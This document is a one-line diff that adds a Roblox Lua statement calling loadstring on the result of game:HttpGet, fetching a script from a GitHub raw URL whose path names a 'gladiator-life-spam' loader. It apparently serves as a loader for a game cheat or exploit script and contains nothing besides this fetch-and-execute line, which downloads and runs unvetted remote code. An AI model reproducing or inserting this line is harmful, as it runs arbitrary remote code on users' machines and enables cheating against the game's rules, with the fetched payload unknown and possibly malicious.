@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/gladiator-life-spam7-rxj14uh5nu2ten.lua"))()
